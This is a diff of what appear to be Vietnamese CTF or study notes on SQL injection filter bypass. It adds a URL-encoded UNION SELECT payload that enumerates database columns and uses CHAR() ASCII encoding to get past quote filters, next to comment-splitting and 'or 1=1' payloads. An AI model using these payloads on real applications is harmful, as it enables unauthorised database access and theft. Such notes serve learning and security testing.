@@ -13,8 +13,13 @@ UNION SELECT flag_3e53dc FROM flag_304ad593-- -
 
 ```url
 ?amount=-1/*&name=*/ or 1=1-- -
+
+amount=-1/*&name=*/%20UNION%20select%201,CONCAT(COLUMN_NAME),TABLE_NAME%20from%20INFORMATION_SCHEMA.COLUMNS%20where%20table_name=CHAR(102,108,97,103,116,97,98,108,101,97,104,105,104,105,104,111,104,111)--%20-
 ```
-=> Dạng dùng comment lọc tham số đầu vào kết hợp 2 query
+=> Dạng dùng comment lọc tham số đầu vào kết hợp 2 query 
+=> Dùng char() => mã ascii bypass lọc `'` hoặc có thể dùng like mã hex hoặc binary
+![image](https://user-images.githubusercontent.com/57553555/161938429-f7f8cf05-8805-4bd5-81ca-335c6f7d75bf.png)
+
 
 ## Bypass space 
 
